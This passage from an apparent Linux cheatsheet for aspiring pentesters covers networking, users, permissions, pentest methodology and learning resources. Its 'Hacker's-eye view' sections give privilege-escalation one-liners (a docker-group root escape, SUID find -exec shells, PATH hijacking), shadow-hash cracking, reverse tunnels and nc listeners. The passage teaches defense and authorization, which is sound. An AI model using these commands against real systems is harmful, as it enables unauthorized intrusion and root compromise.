echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates

# Quick file server (every pentester's favorite trick)
python3 -m http.server 8000                  # serve current dir on port 8000
python3 -m http.server 8000 --bind 127.0.0.1 # localhost only

# ARP and low-level
ip neigh                    # ARP cache
arp -a                      # legacy

# Firewall
sudo iptables -L -n -v      # legacy firewall rules
sudo nft list ruleset       # modern nftables
sudo ufw status verbose     # Ubuntu's friendly wrapper

# Remote shell
ssh user@host
ssh -i key.pem user@host
ssh -p 2222 user@host                              # non-default port
ssh -L 8080:internal-host:80 user@gateway          # local port forward (tunnel)
ssh -R 9000:localhost:22 user@external             # reverse tunnel (callback)
ssh -D 1080 user@gateway                           # dynamic SOCKS proxy
ssh -J jumphost user@target                        # jump host (ProxyJump)
scp file user@host:/path                           # secure copy
sftp user@host                                     # interactive
rsync -avz src/ user@host:/dst/                    # smart sync (only changed bytes)
```

### Reading `ss -tulnp` output

```
Netid State   Local Address:Port    Peer Address:Port  Process
tcp   LISTEN  0.0.0.0:22            0.0.0.0:*         sshd
tcp   LISTEN  127.0.0.1:5432        0.0.0.0:*         postgres
tcp   LISTEN  :::80                 :::*               nginx
```

`0.0.0.0` means "bound to all interfaces, accepting from anywhere." It's an Express app listening on `0.0.0.0` instead of `127.0.0.1`. `127.0.0.1` is loopback only. `::` is the IPv6 wildcard. The first line is much scarier than the second if SSH is exposed to the internet with weak auth.

### 🎯 Hacker's-eye view

The network is the public attack surface. Every offensive engagement starts here.

External recon, before getting in:

```bash
nmap -sV target                    # port scan + service version detection
nmap -sC -sV -p- target            # default scripts + all 65535 ports
nmap -A target                     # aggressive: OS detection, version, scripts, traceroute
nmap --script vuln target          # known-vuln scripts
masscan -p1-65535 10.0.0.0/8 --rate=10000   # fast scanner, large nets
```

Internal recon, after the foothold:

- `ss -tulnp` to find services bound only to localhost. Those are reachable only from inside the trust boundary, often less hardened, prime pivot targets. Like an internal admin route that skipped auth because "it's behind the firewall."
- `ip route` and `arp -a` to map the internal network topology.
- Pivoting via SSH tunnels: `ssh -D 1080` turns a compromised host into a SOCKS proxy. Same technique a developer uses to tunnel through a bastion to reach a private RDS instance, different paperwork.

Common vulnerabilities by category:

| Service exposed | Risk |
|---|---|
| SSH on `0.0.0.0` with password auth | Brute force / credential stuffing. Disable passwords, use keys. |
| Database (3306, 5432, 27017) on a public IP | Unauthenticated or default-cred access. Should never be internet-facing. |
| Redis on `0.0.0.0` with no auth | Trivial RCE via `CONFIG SET dir` plus the key-as-cron-file trick. |
| SMB/445 exposed | EternalBlue and friends. |
| Outbound DNS allowed but nothing else | DNS tunneling for C2. The covert WebSocket of the protocol stack. |
| Jenkins, GitLab, Grafana with weak auth | Pre-auth RCE has happened on every one of these. |

Network deception:

- `curl --resolve` and `/etc/hosts` manipulation can spoof targets the way a service mesh might route traffic to a fake backend.
- ARP spoofing (`arpspoof`, `ettercap`) on a LAN puts you in the middle of someone's traffic. The MITM equivalent of stealing the load balancer's IP.
- SSL stripping is mostly dead in the era of HSTS, but `mitmproxy` is still a daily driver for testing internal services with cert pinning disabled.

Defensive baseline: firewall default-deny inbound, default-deny outbound where feasible (egress containment is the modern frontier in breach blast-radius reduction), bind services to `127.0.0.1` unless they need external reachability, fail2ban for SSH, mTLS for service-to-service.

---

## 8. Basic Security & Identifying User Types

In Linux, identity is a primary key. The number is your UID, indexed in `/etc/passwd`. UID 0 is the superuser row with `is_admin = TRUE`. Everyone else gets row-level security and can only read tables they own.

### Who am I, who is anyone

```bash
whoami                  # current effective username
id                      # uid, gid, groups (the JWT decode of yourself)
id elliot               # someone else's
groups                  # your groups
who                     # who's currently logged in
w                       # who plus what they're running plus idle time
last                    # historical logins (from /var/log/wtmp)
last -20                # last 20
lastlog                 # most recent login per user
who am i                # specifically your terminal session
finger user             # detailed user info (rarely installed by default now)
getent passwd           # full user list (resolves LDAP/NIS too, not just /etc/passwd)
getent group            # full group list
```

### The user/group trinity

| File | Purpose | Permissions |
|---|---|---|
| `/etc/passwd` | One row per user: name, uid, gid, gecos, home, shell | `644` (world-readable) |
| `/etc/shadow` | Password hashes plus aging info | `000` or `640` (root-only) |
| `/etc/group` | Group name to gid to member list | `644` |
| `/etc/gshadow` | Group passwords (rare) | root-only |

A `passwd` line is essentially a denormalized user record:

```
elliot:x:1001:1001:Elliot Alderson,,,:/home/elliot:/bin/bash
└──┬──┘ │ └┬─┘ └┬─┘ └────────┬────────┘ └─────┬─────┘ └───┬───┘
   │    │  │    │            │                 │           └── login shell
   │    │  │    │            │                 └── home directory
   │    │  │    │            └── GECOS (full name plus comments)
   │    │  │    └── primary GID
   │    │  └── UID  (0=root, 1-999=system, 1000+=human users typically)
   │    └── password placeholder ('x' means see /etc/shadow)
   └── username (the natural key)
```

### User types

| UID range | Who | Examples |
|---|---|---|
| `0` | root, total power | `root` |
| `1–999` | system / service accounts | `daemon`, `bin`, `www-data`, `mysql`, `nobody` |
| `1000+` | regular human users | `elliot`, `darlene`, `alice` |
| `65534` | nobody | the "null principal" for "trust nothing" contexts |

Service accounts often have `/usr/sbin/nologin` or `/bin/false` as their shell. They exist to own files, not to log in. Think service principals: meant to be assumed by the runtime, never interactively.

### User management

```bash
sudo useradd -m -s /bin/bash bob       # add bob with home dir and bash shell
sudo passwd bob                         # set bob's password
sudo chage -l bob                       # password aging info for bob
sudo chage -E 2025-12-31 bob            # set account expiry
sudo usermod -aG sudo bob              # add bob to sudo group
sudo usermod -L bob                    # lock account
sudo usermod -U bob                    # unlock
sudo usermod -s /usr/sbin/nologin bob  # disable interactive login
sudo userdel -r bob                    # delete bob and home dir
sudo groupadd devs                     # new group
sudo gpasswd -a alice devs             # add alice to devs
newgrp devs                            # switch your primary group for this session
```

### 🎯 Hacker's-eye view

After landing, an attacker maps the identity graph, the same way BloodHound builds a graph of trust relationships in Active Directory:

```bash
cat /etc/passwd            # who exists?
cat /etc/group             # who's in privileged groups?
getent passwd              # same, but resolves LDAP/network sources too
who; w; last -20           # who's around right now? recent activity?
```

What they're looking for:

Users in `sudo`, `wheel`, `admin`, `docker`, `lxd`, `disk` groups. These are functionally root, the way "Owner" on a GitHub org is functionally admin even if no one wrote it down.

- `docker` group? `docker run -v /:/host -it ubuntu chroot /host` equals root. The Docker socket is a confused-deputy primitive: you ask the daemon nicely, and it runs your code with its privileges.
- `disk` group? Direct read/write to block devices, bypassing the filesystem permissions layer entirely.
- `lxd` or `lxc`? Container escape to root.
- `adm` group? Reads logs, including auth.log with sometimes-sensitive grep targets.

Service accounts with shells, often misconfigured (the service principal that accidentally got interactive login enabled).

Users with `UID=0` other than `root`. This is a classic backdoor. The kernel's auth check is on the ID, not the name. Any UID-0 account IS root.

Password hash crackability: if an attacker exfiltrates `/etc/shadow`, the format is `$id$salt$hash`, a self-describing tagged union.

- `$1$` is MD5 (broken, fast)
- `$5$` is SHA-256
- `$6$` is SHA-512 (the default on most distros for years)
- `$y$` or `$argon2id$` is yescrypt or argon2 (modern, memory-hard, good)

`hashcat -m 1800 hashes.txt rockyou.txt` is the standard offline attack for SHA-512. Defense: long passwords (length beats character classes mathematically, every time), MFA, hash algorithm choice does not save you if the password is `Summer2024!`.

Account hygiene defender checklist:

- No password-auth SSH for any user. Keys only.
- `useradd` defaults audited. No `/bin/bash` shell for service accounts.
- Group memberships reviewed quarterly (especially `sudo`, `docker`). Like an IAM access review.
- `last`, `lastlog`, and `auth.log` shipped to a SIEM.
- Locked accounts: `passwd -l user` (prefix `!` in shadow).

---

## 9. Managing File Permissions & Ownership

Ownership is the foreign key to the user table. Permissions are the RBAC policy enforced at every system call. SUID is `@RunAs(root)` on a single binary, letting a low-priv user invoke code that executes with elevated authority along whatever narrow API surface the binary chooses to expose.

### `chmod`

Two notations: symbolic and octal.

```bash
# Symbolic: u(ser) g(roup) o(ther) a(ll), with +/-/= and r/w/x
chmod u+x script.sh           # add execute for owner
chmod g-w file                # remove write from group
chmod o= file                 # set "other" to nothing
chmod a+r file                # everyone can read
chmod u=rwx,go=rx file        # explicit set

# Octal: each digit is a 3-bit permission flag for one role
# r=4, w=2, x=1
chmod 755 script.sh           # rwxr-xr-x (typical executable)
chmod 644 file.txt            # rw-r--r-- (typical file)
chmod 600 ~/.ssh/id_rsa       # rw------- (private keys, REQUIRED)
chmod 700 ~/.ssh              # rwx------ (private dir)
chmod 777 file                # rwxrwxrwx (the production-bug indicator light)
chmod -R 755 dir/             # recursive
```

Never `chmod 777` your way out of a permission problem. That's the security equivalent of disabling auth to fix a login bug.

### `chown` and `chgrp`

```bash
sudo chown alice file              # change owner
sudo chown alice:devs file         # owner AND group
sudo chgrp devs file               # group only
sudo chown -R alice:alice /home/alice
sudo chown --reference=ref.txt target.txt    # match ref.txt's owner
```

### Special bits

Beyond `rwx` there are three special bits, occupying a 4th octal digit. These change how a file actually executes.

| Bit | Octal | Symbol | On a file | On a directory |
|---|---|---|---|---|
| **SUID** | 4000 | `s` in user-x slot | Runs as the **file owner** | (no effect) |
| **SGID** | 2000 | `s` in group-x slot | Runs as the file's **group** | New files inherit the dir's group |
| **Sticky** | 1000 | `t` in other-x slot | (rarely used) | Only file owner can delete (used on `/tmp`) |

```bash
chmod u+s binary       # SUID
chmod g+s dir          # SGID (on a dir, makes new files inherit the group)
chmod +t /shared       # sticky bit (delete protection on a writable dir)
chmod 4755 prog        # SUID plus 755
ls -l /usr/bin/passwd  # → -rwsr-xr-x. The s is SUID.
ls -ld /tmp            # → drwxrwxrwt. The t is sticky.
```

The sticky bit is a wiki-style policy on a directory. Anyone can write new files (post), but only the original author can delete their own. Every post-it on `/tmp` belongs to whoever stuck it there.

### `umask`

```bash
umask                  # show current (e.g., 0022)
umask 077              # only owner gets perms on new files
```

`umask` is the default constructor for permissions. Subtracted from the system default (777 for dirs, 666 for files). `umask 022` gives new files of 644 and dirs of 755. It's the OS's `Object.assign({...defaults}, {...overrides})` for filesystem ACLs.

### Extended attributes and capabilities

Standard rwx is not the whole story. Two more layers most people don't know exist.

```bash
# Immutable bit: even root cannot modify or delete
sudo chattr +i file         # set immutable
sudo chattr -i file         # remove immutable
lsattr file                 # show extended attributes
# Common attributes: i (immutable), a (append-only), s (secure delete), u (undeletable)

# Capabilities: fine-grained alternative to SUID
getcap /usr/bin/ping        # show capabilities
sudo setcap cap_net_raw+ep /usr/local/bin/myping   # grant just one capability
sudo setcap -r /path/binary # remove all capabilities
getcap -r / 2>/dev/null     # find all binaries with capabilities
```

Capabilities split the kernel's "root powers" into ~40 distinct buckets. Modern systems use them instead of SUID where possible. `ping` historically needed SUID to open a raw socket. Now it can have just `cap_net_raw` and nothing else.

### ACLs

Standard perms describe owner, group, and other. Three identities, max. For "alice can write but bob can only read this one file," use POSIX ACLs (per-principal IAM grants instead of relying solely on group membership):

```bash
setfacl -m u:bob:r-- file
setfacl -m g:devs:rwx dir/
getfacl file
setfacl -x u:bob file       # remove bob's ACL entry
setfacl -b file             # remove all ACLs
```

### 🎯 Hacker's-eye view

This section is ground zero for privilege escalation.

SUID/SGID hunting is the iconic privesc move:

```bash
find / -perm -4000 -type f 2>/dev/null    # all SUID
find / -perm -2000 -type f 2>/dev/null    # all SGID
find / -perm -6000 -type f 2>/dev/null    # both
```

A standard system has a known set of SUID binaries: `passwd`, `sudo`, `mount`, `su`, sometimes `ping` on older systems. Anything else is suspicious, the way an unfamiliar package in your `package-lock.json` is suspicious. Even for the standard ones, version vulnerabilities matter: a SUID-root `nmap` (older versions had `--interactive` shells) or `find` (`-exec /bin/sh \;`) is instant root. [GTFOBins](https://gtfobins.github.io) catalogs these like a CVE database for everyday utilities turned weapon.

Don't forget capabilities. Modern systems may have very few SUID binaries but plenty of dangerous capabilities:

```bash
getcap -r / 2>/dev/null
```

`cap_dac_read_search`, `cap_setuid`, `cap_sys_admin`, `cap_sys_ptrace` are all paths to root. GTFOBins covers capability abuse too.

World-writable files:

```bash
find / -perm -o=w -type f 2>/dev/null
find / -perm -o=w -type d 2>/dev/null
```

If `/etc/passwd` is world-writable (it shouldn't be, but you'd be surprised), any user can add a UID-0 account. If a script that cron runs as root is world-writable, any user can edit it and own the box on the next tick.

Wrong ownership is subtler. Web app files owned by `root` but the web server runs as `www-data` either break the app or, if the app has an upload feature with sloppy perm-setting, lead to weird states. Files in `/home/elliot` owned by `tyrell` are either misconfiguration or post-exploitation evidence.

The classic privesc chain via permissions:

1. `find / -perm -4000 -type f 2>/dev/null` reveals an unusual SUID binary like `/usr/local/bin/backup`.
2. `strings /usr/local/bin/backup` shows it calls `tar` without an absolute path.
3. Attacker creates a malicious `tar` in a writable directory, prepends to `$PATH`.
4. Runs the SUID `backup`. The malicious `tar` runs as root.
5. Root shell.

This is the supply-chain attack of the local filesystem. Dependency is a system command, registry is `$PATH`, version-pin is the absolute path the developer forgot to write. Defense: SUID programs set `PATH` explicitly, use absolute paths for everything, drop privileges as soon as possible.

Defender's permission audit:

```bash
# Files writable by anyone (top suspects)
find / -xdev -type f -perm -o+w ! -path "/proc/*" 2>/dev/null

# SUID/SGID files outside the expected list
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null

# Files with no owner (deleted users), possible attacker artifacts
find / -xdev \( -nouser -o -nogroup \) 2>/dev/null

# All capability-bearing binaries
getcap -r / 2>/dev/null

# Immutable files (could be defender-set or attacker-set persistence)
sudo lsattr -R / 2>/dev/null | grep -- '----i-'
```

---

## 10. Pen Testing Fundamentals: What Every Ethical Hacker Should Know

A pentest without authorization is a felony with a `git blame` line on it. A pentest without methodology is brute-force without a hypothesis. A pentest without a report is unmerged work. The job is all three at once.

Linux fluency is the language. Pen testing is the application that uses it.

### 10.1 The Authorization Rule

Nothing in this cheatsheet is legal to use against a system you don't own or have written permission to test. The Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and similar laws worldwide do not care that you "didn't do any damage" or "were just curious." Unauthorized access is the crime. Intent is sentencing.

A legitimate engagement always has:

- **A signed Statement of Work (SOW)** describing the engagement type, deliverables, and timeline.
- **Rules of Engagement (RoE)** specifying scope (IP ranges, domains, applications), out-of-scope items, allowed techniques, time windows, and emergency contacts.
- **Authorization letter** signed by someone who actually has authority to authorize testing on those assets. "The dev manager said it was fine" doesn't survive subpoena.
- **Cloud provider notification** where required. AWS no longer requires it for most services. Azure and GCP have their own policies. Always verify.
- **Data handling agreement.** What happens to credentials, PII, and screenshots you collect. Encrypted at rest, deleted on a schedule, never shared outside the agreed team.

If you don't have the paperwork, you don't have an engagement. You have a felony in progress.

### 10.2 Engagement Types

| Engagement | Scope | Mindset |
|---|---|---|
| **Vulnerability Assessment** | Find and rank vulnerabilities | Breadth, automated scans, low exploitation |
| **Penetration Test** | Find AND exploit a defined scope | Depth, manual validation, proof of impact |
| **Red Team** | Achieve specific objectives against a defending blue team, often without their knowledge | Stealth, full kill chain, social engineering allowed |
| **Purple Team** | Red team plus blue team collaborating in real time | Detective control improvement |
| **Bug Bounty** | Open-scope public program with payout per finding | Volume, novelty, write-up quality |

Within penetration tests, the box color tells you how much you know going in:

- **Black box.** Nothing. Production-only inputs. Like running E2E tests against a deployed environment with no source.
- **Gray box.** Limited info, sometimes a low-priv user account. The typical "we gave you a tester account, find the rest."
- **White box** (also crystal box). Full access including source code, architecture diagrams, admin credentials. Unit-tests-with-mocks: you can see the internals.

White box is more thorough per dollar. Black box more closely simulates a real external attacker. Gray box is the pragmatic middle ground most firms ask for.

### 10.3 The Methodology

The industry-standard reference is PTES (Penetration Testing Execution Standard). It overlaps heavily with OSSTMM, NIST SP 800-115, and MITRE ATT&CK.

Think of a pentest as a CI/CD pipeline with stages, where each stage's output is the next stage's input.

**Phase 1: Pre-engagement.** Scope, RoE, contracts, kickoff call. The README and CONTRIBUTING.md of the engagement.

**Phase 2: Reconnaissance (passive).** Gather info without touching the target. The "read the docs" phase.

- WHOIS, DNS, subdomain enumeration
- Search engines, GitHub for leaked secrets, archived sites (`web.archive.org`)
- LinkedIn for people, then guessable email formats
- Tools: `amass`, `subfinder`, `theharvester`, `shodan`, `crt.sh`, `dnsdumpster`

**Phase 3: Scanning and enumeration (active).** Touch the target, identify services and versions. The integration-test phase: actual requests, actual responses, actual fingerprints.

- Port scanning: `nmap -sC -sV -p- target`
- Web fingerprinting: `whatweb`, `wappalyzer`, browser DevTools, `httpx`
- Directory brute force: `ffuf`, `gobuster`, `feroxbuster` against discovered web roots
- Service-specific enumeration: `enum4linux` for SMB, `snmp-check`, `smbclient`, `rpcclient`

**Phase 4: Exploitation.** Turn vulnerabilities into access. The "demonstrate the bug is real" phase.

- Public exploits: `searchsploit` (offline ExploitDB), Metasploit, GitHub
- Web app: Burp Suite, `sqlmap`, manual fuzzing
- Credential attacks: `hydra`, `john`, `hashcat` (offline only)
- Custom: writing your own when off-the-shelf doesn't fit. This is where seniors are made.

**Phase 5: Post-exploitation.** What you do *after* getting in. The "what's the actual blast radius" phase.

- Local enumeration: `linpeas.sh`, `LinEnum.sh`, `pspy` on Linux. `winpeas`, `seatbelt`, `bloodhound` on Windows.
- Privilege escalation: SUID, sudo misconfig, kernel exploits (last resort), credential reuse.
- Lateral movement: SSH key reuse, pass-the-hash, kerberoasting, exploiting trust relationships. The graph traversal phase.
- Persistence (if in scope): cron, systemd units, SSH `authorized_keys`, web shells, immutable bit on rootkit binaries.
- Data identification: find the actual sensitive data ("crown jewels"). Demonstrate impact, not just access. "I have a shell" is not a finding. "I have the customer database" is.

**Phase 6: Reporting.** The deliverable. This is where pentests become valuable or worthless.

A finding the client can't act on is worthless. A finding without proof is unbelievable. The structure that works:

1. **Executive summary** (non-technical, 1-2 pages, business risk language)
2. **Scope and methodology** (what was tested, how, when)
3. **Findings**, each with title, severity (CVSS), affected assets, description, reproduction steps with screenshots/commands, impact, remediation
4. **Appendices** (raw scan data, tool output, references)

CVSS gives a number. The narrative gives the meaning. Junior pentesters submit scans. Senior pentesters submit stories with evidence. The difference is the difference between a stack trace and a post-mortem.

### 10.4 The Tooling Map

You don't need to memorize every tool. You need to know which category solves which problem.

| Category | Tools |
|---|---|
| Recon (passive) | amass, subfinder, theharvester, shodan, crt.sh, github-dorking |
| Recon (active) | nmap, masscan, rustscan, naabu |
| Web enumeration | ffuf, gobuster, feroxbuster, wfuzz, dirb, httpx |
| Web testing | Burp Suite (Community / Pro), OWASP ZAP, mitmproxy, Caido |
| Web exploitation | sqlmap, XSStrike, commix, nikto |
| Wireless | aircrack-ng, kismet, hcxdumptool, wifite |
| Password attacks (online) | hydra, medusa, ncrack, patator |
| Password attacks (offline) | hashcat, john the ripper, hcxtools |
| Exploitation framework | Metasploit, Sliver, Cobalt Strike (commercial), Mythic |
| Linux post-ex | linpeas, LinEnum, pspy, GTFOBins |
| Windows / AD post-ex | winpeas, seatbelt, bloodhound, mimikatz, rubeus, certipy |
| C2 / persistence | Sliver, Mythic, Havoc, Empire (legacy) |
| Pivoting | chisel, ligolo-ng, ssh tunnels, proxychains |
| Forensics / DFIR | volatility, autopsy, sleuthkit |

Kali Linux is the standard pentest distribution. Parrot OS is the alternative. They are not magic, just Debian with the tools preinstalled. You can `apt install` your way to the same setup on any Ubuntu box. Mr. Robot famously uses Kali on the show, which is a small piece of why it became a pop-culture reference and not just a tool.

### 10.5 Frameworks Worth Knowing By Name

Clients and employers will name-drop these.

- **MITRE ATT&CK.** Knowledge base of adversary tactics and techniques. Modern detection and red team conversations reference "T1059.004" style technique IDs. Bookmark `attack.mitre.org`.
- **OWASP Top 10.** Ten most common web app vulnerability categories. Updated every few years. The SOLID principles of web sec, more or less.
- **OWASP Testing Guide.** Longer-form testing methodology for web apps.
- **CWE** (Common Weakness Enumeration). The taxonomy ("CWE-89: SQL Injection").
- **CVE** (Common Vulnerabilities and Exposures). The instances ("CVE-2021-44228" is Log4Shell).
- **CVSS.** 0.0 to 10.0 severity score. Currently v3.1, with v4.0 rolling out.
- **NIST SP 800-115.** US government technical guide to security testing.
- **PCI DSS, HIPAA, SOC 2.** Compliance frameworks you may be testing *for*. Different scopes, different priorities, all auditable.
- **The Cyber Kill Chain** (Lockheed Martin). Older but still cited.

### 10.6 Note-Taking and Evidence Discipline

A pentest generates hundreds of commands and outputs. If you can't reproduce a finding two weeks later when the report is being reviewed, the finding may as well not exist. Treat your notes the way you'd treat git history on a real codebase: commit early, commit often, write good messages.

- **Hierarchical notes per host.** CherryTree, Obsidian, Joplin, Notion. Whatever you'll actually use.
- **A scripted command logger.** The `script` command, `tmux` logging, or something like `pentest-log`. Your `tail -f` on yourself.
- **Screenshots immediately** when something interesting happens. Browser, terminal, scanner. Timestamp them.
- **One folder per target** with subfolders for `recon/`, `exploitation/`, `post-ex/`, `loot/`. Same way a microservice gets its own repo.
- **A running findings list** updated as you go, not at the end.

The senior trick: at the end of each day, write a one-paragraph summary of what you tried, what worked, what didn't. Future-you reading this on report day will thank present-you for the commit message.

### 10.7 The Mindset Shift

Pentesters describe their work as "thinking like an attacker." The more accurate description is thinking like a system that's been lied to.

Every input is suspicious, the way every untrusted JSON body is suspicious to a parser. Every assumption the developer made is a potential vulnerability if the assumption isn't enforced at runtime. Every trust boundary is an attack surface. Every "this isn't reachable from the internet" is provably false until you check.

There's a line that gets repeated in this corner of the industry: "people are the best exploits." It's true and worth taking seriously. The fanciest 0-day is rarely as effective as a well-crafted phishing email. Social engineering is in scope on most red team engagements for a reason. You can patch software. You can't patch behavior at the same speed.

Three habits that separate good pentesters from great ones:

1. **Read the source when you can.** White box findings are deeper than black box findings. Understanding the code reveals classes of bugs that would never show up in a scan, the way reading the implementation reveals concurrency bugs that black-box load tests miss for years.
2. **Chain low-severity findings.** Three "informational" findings can combine into a critical, the same way three small architectural compromises stack into a production incident. The skill is seeing the chain.
3. **Demonstrate business impact.** "I got a shell" is a starting point. "I got a shell, and from there reached the domain controller, and from there read the customer database" is the post-mortem that gets fixed.

### 🎯 Where this cheatsheet fits

Every section above (1 through 9) is something you'll use in nearly every Linux pentest engagement. Reading files is recon. sudo and SUID are privesc. Permissions audits are post-ex. Network commands are recon and pivoting. Scripts are persistence and automation. Identifying user types is the AD-equivalent on Linux. The fluency you build with these primitives is the difference between staring at a shell prompt wondering what to type next, and reading the prompt the way an attacker does — fluent and instinctive, the same way an experienced developer reads a stack trace and just sees the bug.

---

## 11. Where to Learn This Stuff (Properly)

The internet is full of "Top 10 Linux Commands" listicles. This is the better stuff.

### Cisco Networking Academy (NetAcad)

Cisco's free courseware is genuinely excellent and underused outside of formal IT programs. The Linux courses are developed in partnership with NDG (Network Development Group) and align with industry certifications.

- **NDG Linux Unhatched.** ~8 hours, total beginner. Browser-based virtual lab. The fastest "I have never opened a terminal" to "I can move around" path.
- **NDG Linux Essentials.** Aligns with the LPI Linux Essentials cert. The most complete free intro to Linux at a slightly more serious level.
- **NDG Linux I.** First half of LPIC-1 prep. System administration basics.
- **NDG Linux II.** Second half of LPIC-1 prep. Networking, security, scripting.
- **CyberOps Associate.** SOC analyst-flavored security course. Heavy on Linux because real SOCs run on Linux.
- **Introduction to Cybersecurity / Cybersecurity Essentials.** Lighter introductions, good for context if security is new.
- **CCNA.** The networking cert. Not Linux-specific, but every pentester benefits from CCNA-level networking.

Sign up at `netacad.com`. Many courses are self-paced and free.

### Linux Foundation, LPI, Red Hat, CompTIA

The four big certification ecosystems for Linux skill.

- **Linux Foundation (LFS101: Introduction to Linux).** Free on edX, professionally produced. The first course Linus Torvalds himself recommended for years. **LFCS** and **LFCE** are the certs (sysadmin, engineer).
- **LPI (Linux Professional Institute).** **Linux Essentials** is the entry cert. **LPIC-1, LPIC-2, LPIC-3** are progressively deeper. Vendor-neutral and globally recognized.
- **Red Hat.** **RHCSA** and **RHCE.** Tied to RHEL specifically, very respected in enterprise environments. Hands-on practical exams.
- **CompTIA Linux+.** Vendor-neutral, hires-friendly, less depth than LPIC.

If you only do one for security work, Linux Foundation's LFS101 plus LPIC-1 prep gets you most of the way.

### Free books that respect your time

- **The Linux Command Line** by William Shotts. Free PDF at `linuxcommand.org`. The single best free Linux book in existence. Read this if you read nothing else.
- **How Linux Works** by Brian Ward. Not free (No Starch Press) but worth every dollar. Goes deeper than "here are commands" into how the system actually works under the hood.
- **The Art of Command Line** at `github.com/jlevy/the-art-of-command-line`. Dense, opinionated, brilliant.
- **Linux From Scratch** at `linuxfromscratch.org`. You build a Linux system from source, by hand. Nothing teaches you Linux internals like this.

### Free interactive practice

- **OverTheWire Bandit** (`overthewire.org/wargames/bandit/`). 30+ levels, each one teaches you a new Linux skill via an SSH challenge. The best beginner Linux trainer ever made. Start here if you remember nothing else from this section.
- **Linux Journey** (`linuxjourney.com`). Free, gamified, self-paced.
- **MIT Missing Semester** (`missing.csail.mit.edu`). The class your CS program didn't teach but should have. Shell, scripting, vim, git, debugging. Six hours of video that level you up permanently.
- **Exercism shell track** (`exercism.org`). Mentored exercises in bash.
- **Cybrary** (`cybrary.it`). Free security-focused courses with Linux components.

### Reference sites that actually answer the question

- **explainshell.com.** Paste any command. Get a plain-English explanation of every flag. Bookmark this.
- **tldr.sh** (and the `tldr` CLI tool). Simplified, example-heavy man pages. Install with `sudo apt install tldr` or `brew install tldr`.
- **ss64.com.** Comprehensive command reference, well-organized.
- **ArchWiki** (`wiki.archlinux.org`). The single best Linux documentation in existence, regardless of which distro you run. Even if you'll never touch Arch, the wiki is gold.
- **bash.cyberciti.biz** and the broader nixCraft tutorials.
- **The Linux Documentation Project.**

### Security-specific Linux practice

- **HackTheBox Academy** has dedicated Linux Fundamentals and Linux Privilege Escalation paths.
- **TryHackMe Linux Fundamentals** (1, 2, 3) plus **Linux PrivEsc** room.
- **PortSwigger Web Security Academy** (`portswigger.net/web-security`). Free, web app focused. The best web sec training on the internet.
- **PicoCTF** (`picoctf.org`). Free CTFs from Carnegie Mellon. Beginner-friendly.

### Community and ongoing learning

- **r/linux4noobs** and **r/linuxquestions** for actually-helpful answers.
- **r/netsec** and **r/asknetsec** for security content.
- **commandlinefu.com** for clever one-liners.
- **The Daily WTF** for cautionary tales from production.

Pick one structured course (NDG Linux Essentials or LFS101) and one practice ladder (Bandit, then HTB Academy). Run them in parallel. Skip the listicles.

---

## 12. Quick Reference Tables

### File operations

| Goal | Command |
|---|---|
| Show file contents | `cat`, `tac`, `less`, `head`, `tail`, `nl` |
| Identify file type | `file` |
| Find printable text in binary | `strings` |
| Hex dump | `xxd`, `hexdump -C`, `od -c` |
| Encode/decode base64 | `base64`, `base64 -d` |
| Hash a file | `md5sum`, `sha256sum` |
| Create empty file | `touch`, `mktemp` |
| Make directory | `mkdir -p` |
| Copy | `cp -r`, `install`, `rsync` |
| Move/rename | `mv` |
| Delete | `rm -r`, `rmdir` |
| Securely wipe | `shred -uvz` |
| Hard / symbolic link | `ln`, `ln -s`, `readlink -f` |
| Path manipulation | `realpath`, `basename`, `dirname` |

### Permissions / ownership

| Goal | Command |
|---|---|
| View permissions | `ls -l`, `stat` |
| Change permissions | `chmod 644 file`, `chmod u+x file` |
| Change owner | `chown user:group file` |
| Default new-file perms | `umask` |
| Find SUID binaries | `find / -perm -4000 -type f 2>/dev/null` |
| Find world-writable | `find / -perm -o=w 2>/dev/null` |
| Capabilities | `getcap -r /`, `setcap`, `lsattr` |
| Immutable bit | `chattr +i file`, `lsattr file` |
| List ACLs | `getfacl file`, `setfacl -m u:bob:r-- file` |

### Search & extract

| Goal | Command |
|---|---|
| Find files by name | `find / -name "pattern"`, `locate pattern` |
| Find files by perms | `find / -perm -4000` |
| Search inside files | `grep -rni "term" /path`, `rg term`, `ag term` |
| Where is this binary | `which`, `whereis`, `type`, `command -v` |
| Replace in file | `sed -i 's/old/new/g' file` |
| Extract column | `awk '{print $1}'`, `cut -d: -f1` |
| Frequency count | `sort \| uniq -c \| sort -rn` |
| Compare files | `diff`, `cmp`, `comm` |

### Shell mechanics

| Goal | Command |
|---|---|
| Run script in current dir | `./script.sh` |
| Source script (run in current shell) | `. script.sh` or `source script.sh` |
| Search PATH | `echo $PATH`, `which cmd` |
| Background a job | `cmd &`, `Ctrl+Z` then `bg` |
| List jobs | `jobs` |
| Foreground | `fg %1` |
| Survive terminal close | `nohup cmd &`, `disown` |
| History | `history`, `!!`, `!$`, `Ctrl+R` |
| Aliases | `alias ll='ls -la'`, `unalias`, `type ll` |

### Users & privilege

| Goal | Command |
|---|---|
| Who am I | `id`, `whoami` |
| Switch user | `su - user`, `newgrp group` |
| Run as root | `sudo cmd`, `sudo -i` |
| List my sudo rights | `sudo -l` |
| Add user | `sudo useradd -m -s /bin/bash name` |
| Add to group | `sudo usermod -aG group user` |
| Lock account | `sudo usermod -L user`, `passwd -l user` |
| List logins | `last`, `w`, `who`, `lastlog` |
| Resolve user info | `getent passwd`, `getent group` |

### Network

| Goal | Command |
|---|---|
| Show IPs | `ip a`, `hostname -I` |
| Show routes | `ip route` |
| Listening ports | `ss -tulnp` |
| Active connections | `ss -tnp`, `lsof -i` |
| DNS query | `dig example.com`, `dig +short example.com` |
| HTTP request | `curl -sL url`, `curl -I url` |
| Download | `wget url`, `curl -O url` |
| Quick file server | `python3 -m http.server 8000` |
| Listener / banner grab | `nc -lvnp 4444`, `nc target 22` |
| Port scan range | `nmap -sV target`, `nc -zv target 1-1000` |
| Packet capture | `sudo tcpdump -i any` |
| TLS inspection | `openssl s_client -connect host:443` |
| SSH tunnel (local) | `ssh -L 8080:host:80 user@gw` |
| SOCKS proxy | `ssh -D 1080 user@gw` |
| Reverse tunnel | `ssh -R 9000:localhost:22 user@external` |
| Sync files | `rsync -avz src/ user@host:/dst/` |

### Pen test phase quick map

| Phase | Primary commands and tools |
|---|---|
| Recon (passive) | `whois`, `dig`, `amass`, `subfinder`, `crt.sh`, `theharvester` |
| Recon (active) | `nmap`, `masscan`, `ffuf`, `gobuster` |
